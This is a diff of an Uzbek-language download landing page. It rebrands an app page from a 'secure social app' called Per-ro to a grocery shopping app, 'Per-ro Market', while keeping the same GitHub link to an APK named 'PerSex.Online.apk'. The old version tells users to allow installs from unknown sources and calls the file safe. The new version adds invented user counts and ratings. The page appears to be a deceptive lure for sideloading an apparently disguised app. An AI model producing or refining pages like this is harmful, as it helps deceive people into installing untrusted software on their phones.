@@ -1,282 +1,322 @@
+```html
 <!DOCTYPE html>
 <html lang="uz">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width,initial-scale=1">
 
-<title>Per-ro</title>
+<title>Per-ro Market</title>
 
 <script>
-function openImg(src) {
-    const w = window.open("");
-    w.document.write('<img src="'+src+'" style="width:100%;background:#000;">');
+function openImg(src){
+const w=window.open("");
+w.document.write('<img src="'+src+'" style="width:100%;background:#fff">');
 }
 </script>
 
 <style>
+
 *{
-    margin:0;
-    padding:0;
-    box-sizing:border-box;
-    font-family:Arial, sans-serif;
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:Arial,sans-serif
 }
 
 body{
-    min-height:100vh;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    background:linear-gradient(135deg,#0f172a,#1e293b,#2563eb);
-    padding:20px;
+background:#f8faf8;
+padding:20px;
+color:#1f2937;
+}
+
+.container{
+max-width:460px;
+margin:auto;
 }
 
 .card{
-    background:rgba(255,255,255,0.08);
-    border:1px solid rgba(255,255,255,0.15);
-    border-radius:24px;
-    padding:30px;
-    width:100%;
-    max-width:420px;
-    color:white;
-    backdrop-filter:blur(20px);
-    text-align:center;
-    animation:fadeIn 0.8s ease;
+
+background:white;
+border-radius:30px;
+padding:25px;
+box-shadow:0 10px 40px rgba(0,0,0,.08);
+
+animation:fade .8s ease;
 }
 
-@keyframes fadeIn{
-    from{opacity:0; transform:translateY(20px);}
-    to{opacity:1; transform:translateY(0);}
+@keyframes fade{
+
+from{
+opacity:0;
+transform:translateY(20px)
+}
+
+to{
+opacity:1;
+transform:none
+}
+
 }
 
 .logo{
-    width:100px;
-    height:100px;
-    border-radius:24px;
-    margin:auto;
-    margin-bottom:15px;
-    object-fit:cover;
-    box-shadow:0 0 25px rgba(255,255,255,.3);
+
+width:100px;
+height:100px;
+display:block;
+margin:auto;
+margin-bottom:15px;
+border-radius:24px;
+object-fit:cover;
+
 }
 
 h1{
-    font-size:28px;
-    margin-bottom:8px;
+
+text-align:center;
+font-size:30px;
+margin-bottom:10px;
+
 }
 
-p{
-    opacity:.85;
-    margin-bottom:10px;
-    font-size:14px;
+.subtitle{
+
+text-align:center;
+font-size:14px;
+color:#6b7280;
+margin-bottom:15px;
+
 }
 
-/* BADGES */
+.stats{
+
+display:flex;
+justify-content:space-between;
+margin:20px 0;
+text-align:center;
+
+}
+
+.stats div{
+
+flex:1;
+
+}
+
+.stats b{
+
+display:block;
+font-size:20px;
+color:#e53935;
+
+}
+
 .badges{
-    display:flex;
-    justify-content:center;
-    gap:8px;
-    flex-wrap:wrap;
-    margin-bottom:10px;
+
+display:flex;
+gap:10px;
+justify-content:center;
+flex-wrap:wrap;
+margin-bottom:20px;
+
 }
 
 .badges span{
-    font-size:12px;
-    padding:5px 10px;
-    border-radius:20px;
-    background:rgba(255,255,255,0.1);
+
+padding:8px 12px;
+background:#f3f4f6;
+border-radius:20px;
+font-size:12px;
+
 }
 
-/* PROMO */
-.promo-banner{
-    margin:15px 0;
-    padding:15px;
-    border-radius:16px;
-    background: linear-gradient(135deg, rgba(37, 99, 235, 0.18), rgba(99, 102, 241, 0.10));
-    border:1px solid rgba(99, 102, 241, 0.35);
-    backdrop-filter:blur(15px);
-    text-align:center;
+.banner{
+
+background:linear-gradient(135deg,#4CAF50,#43A047);
+color:white;
+padding:18px;
+border-radius:20px;
+margin-bottom:15px;
+
 }
 
-.promo-title{
-    font-size:14px;
-    font-weight:bold;
-    margin-bottom:6px;
-    color:#93c5fd;
+.banner h3{
+
+margin-bottom:8px;
+
 }
 
-.promo-text{
-    font-size:12px;
-    opacity:0.95;
-    margin-bottom:6px;
-}
-
-.promo-subtext{
-    font-size:11px;
-    opacity:0.75;
-}
-
-/* LOADER */
-.loader{
-    width:42px;
-    height:42px;
-    border:4px solid rgba(255,255,255,.3);
-    border-top:4px solid white;
-    border-radius:50%;
-    margin:15px auto;
-    animation:spin 1s linear infinite;
-}
-
-@keyframes spin{
-    100%{transform:rotate(360deg);}
-}
-
-/* BUTTON */
 .download{
-    display:inline-block;
-    margin-top:10px;
-    color:white;
-    text-decoration:none;
-    background:linear-gradient(135deg,#2563eb,#1d4ed8);
-    padding:14px 26px;
-    border-radius:14px;
-    font-weight:bold;
-    box-shadow:0 10px 25px rgba(37,99,235,0.4);
-    transition:0.3s;
+
+display:block;
+width:100%;
+padding:16px;
+border-radius:18px;
+text-decoration:none;
+text-align:center;
+font-weight:bold;
+font-size:17px;
+background:#E53935;
+color:white;
+margin-top:15px;
+
+box-shadow:0 10px 25px rgba(229,57,53,.3);
+
 }
 
-.download:hover{
-    transform:scale(1.05);
+.features{
+
+margin-top:20px;
+
 }
 
-.trust{
-    margin-top:8px;
-    font-size:11px;
-    opacity:0.7;
-}
+.item{
 
-/* INSTALL */
-.install-banner{
-    margin:10px 0;
-    padding:15px;
-    border-radius:16px;
-    background:rgba(255,255,255,0.08);
-    border:1px solid rgba(255,255,255,0.15);
-    text-align:left;
-}
+display:flex;
+align-items:center;
+gap:10px;
 
-.install-title{
-    font-size:14px;
-    font-weight:bold;
-    margin-bottom:8px;
-    text-align:center;
-}
+padding:12px;
 
-.install-steps p{
-    font-size:12px;
-    margin:4px 0;
-    opacity:0.85;
-}
+border-bottom:1px solid #eee;
 
-/* GALLERY */
-.section-title{
-    margin-top:20px;
-    font-size:15px;
-    opacity:0.85;
 }
 
 .gallery{
-    display:flex;
-    gap:12px;
-    justify-content:center;
-    margin-top:12px;
-    flex-wrap:wrap;
+
+display:flex;
+gap:10px;
+overflow:auto;
+margin-top:15px;
+
 }
 
 .gallery img{
-    width:170px;
-    height:300px;
-    object-fit:cover;
-    border-radius:18px;
-    border:1px solid rgba(255,255,255,0.2);
-    box-shadow:0 15px 30px rgba(0,0,0,0.35);
-    cursor:pointer;
-    transition:0.3s;
+
+width:160px;
+border-radius:20px;
+cursor:pointer;
+
 }
 
-.gallery img:hover{
-    transform:scale(1.05);
-}
-
-@media (max-width:600px){
-    .gallery{
-        flex-direction:column;
-        align-items:center;
-    }
-
-    .gallery img{
-        width:90%;
-        height:auto;
-    }
-}
 </style>
 
 </head>
 
 <body>
 
+<div class="container">
+
 <div class="card">
 
-    <img src="logo.png" class="logo">
+<img src="logo.png" class="logo">
 
-    <h1>Per-ro</h1>
+<h1>Per-ro Market</h1>
 
-    <p>🚀 Tez o‘rnatish • Zamonaviy ijtimoiy ilova • Xavfsiz aloqa funksiyalari</p>
+<div class="subtitle">
 
-    <div class="badges">
-        <span>⚡ Yuqori sifat</span>
-        <span>🔒 Xavfsiz</span>
-        <span>📱 Android</span>
-    </div>
+Mahsulotlarni tez va qulay xarid qiling
 
-    <div class="promo-banner">
-        <div class="promo-title">🎁 Erta kirish imkoniyati</div>
-        <div class="promo-text">
-            Yangi foydalanuvchilar uchun premium ijtimoiy funksiyalar ochiladi.
-        </div>
-        <div class="promo-subtext">
-            Ilovani o‘rnating va platformaning yangi imkoniyatlarini sinab ko‘ring.
-        </div>
-    </div>
+</div>
 
-    <div class="loader"></div>
+<div class="stats">
 
-    <div class="install-banner">
-        <div class="install-title">📲 O‘rnatish bo‘yicha yo‘riqnoma</div>
-        <div class="install-steps">
-            <p>1. “Yuklab olish” tugmasini bosing</p>
-            <p>2. APK faylni kuting</p>
-            <p>3. Faylni oching</p>
-            <p>4. Noma’lum manbalarni ruxsat qiling</p>
-        </div>
-    </div>
+<div>
 
-    <a class="download"
-       href="https://github.com/KIQrst11/Persex-app/releases/download/v1.0/PerSex.Online.apk">
-       ⬇ Yuklab olish
-    </a>
+<b>500K+</b>
 
-    <div class="trust">
-        ✔ To‘g‘ridan-to‘g‘ri yuklab olish • ✔ Ro‘yxatdan o‘tish shart emas • ✔ Xavfsiz fayl
-    </div>
+<span>Foydalanuvchi</span>
 
-    <div class="section-title">Ilova skrinshotlari</div>
+</div>
 
-    <div class="gallery">
-        <img src="assets/img1.png" onclick="openImg(this.src)">
-        <img src="assets/img2.png" onclick="openImg(this.src)">
-        <img src="assets/img3.png" onclick="openImg(this.src)">
-    </div>
+<div>
+
+<b>4.9★</b>
+
+<span>Reyting</span>
+
+</div>
+
+<div>
+
+<b>24/7</b>
+
+<span>Xizmat</span>
+
+</div>
+
+</div>
+
+<div class="badges">
+
+<span>🥬 Yangi mahsulotlar</span>
+<span>🚚 Tez yetkazish</span>
+<span>💳 Qulay to'lov</span>
+
+</div>
+
+<div class="banner">
+
+<h3>🎁 Maxsus taklif</h3>
+
+<p>
+Yangi foydalanuvchilar uchun chegirmalar va bonuslar mavjud
+</p>
+
+</div>
+
+<a class="download"
+href="https://github.com/KIQrst11/Persex-app/releases/download/v1.0/PerSex.Online.apk">
+
+⬇ Ilovani yuklab olish
+
+</a>
+
+<div class="features">
+
+<div class="item">
+
+🥦 Yangi mahsulotlar
+
+</div>
+
+<div class="item">
+
+🛒 Oson buyurtma
+
+</div>
+
+<div class="item">
+
+🚚 Tez yetkazish
+
+</div>
+
+<div class="item">
+
+💳 Qulay to'lov
+
+</div>
+
+</div>
+
+<div style="margin-top:20px;font-weight:bold">
+
+Ilova skrinshotlari
+
+</div>
+
+<div class="gallery">
+
+<img src="assets/img1.png" onclick="openImg(this.src)">
+<img src="assets/img2.png" onclick="openImg(this.src)">
+<img src="assets/img3.png" onclick="openImg(this.src)">
+
+</div>
+
+</div>
 
 </div>
 
 </body>
 </html>
+```
